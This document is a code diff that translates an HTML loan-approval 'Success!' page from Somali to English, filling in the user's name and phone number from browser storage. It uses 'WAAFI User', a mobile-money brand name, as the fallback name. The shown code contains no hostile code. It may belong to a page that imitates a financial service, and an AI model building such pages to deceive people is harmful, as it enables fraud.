@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="so">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Guul!</title>
+  <title>Success!</title>
   <style>
     * {
       margin: 0;
@@ -157,27 +157,27 @@
     </svg>
   </div>
 
-  <div class="title">Guul!</div>
-  <div class="subtitle">Deeqdaada waa la ansixiyay.<br />Waxaad hadda heli kartaa lacagtaada.</div>
+  <div class="title">Success!</div>
+  <div class="subtitle">Your loan has been approved.<br />You can now access your funds.</div>
 
   <!-- User details (from localStorage) -->
   <div class="user-card" id="userCard">
     <div class="row">
-      <span class="label">Magaca</span>
+      <span class="label">Name</span>
       <span class="value" id="displayName">—</span>
     </div>
     <div class="row">
-      <span class="label">Lambarka</span>
+      <span class="label">Phone</span>
       <span class="value" id="displayPhone">—</span>
     </div>
     <div class="row">
-      <span class="label">Xaaladda</span>
-      <span class="value" style="color:#34c759;">✅ La ansixiyay</span>
+      <span class="label">Status</span>
+      <span class="value" style="color:#34c759;">✅ Approved</span>
     </div>
   </div>
 
   <!-- Continue button -->
-  <button class="btn" id="continueBtn">Sii wad</button>
+  <button class="btn" id="continueBtn">Continue</button>
 
   <div class="version-footer">Version 12.4.0892 (1200040892)</div>
 </div>
@@ -185,7 +185,7 @@
 <script>
   (function() {
     // Retrieve user data from localStorage
-    const name = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Adeegsade';
+    const name = localStorage.getItem('fullName') || localStorage.getItem('name') || 'WAAFI User';
     const phone = localStorage.getItem('phone') || '—';
 
     document.getElementById('displayName').textContent = name;
